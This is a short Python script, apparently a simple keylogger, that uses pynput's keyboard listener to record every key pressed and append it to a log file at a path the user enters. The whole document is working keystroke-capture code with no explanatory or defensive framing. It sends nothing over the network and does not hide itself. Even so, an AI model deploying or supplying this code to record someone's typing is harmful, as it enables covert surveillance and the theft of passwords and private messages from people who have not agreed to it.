from pynput.keyboard import Listener

log_file=input("Enter the path: ")

def on_press(key):
    try:
        with open(log_file,"a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file,"a") as f:
            f.write(f"{key}")
with Listener(on_press=on_press) as listener:
    listener.join()



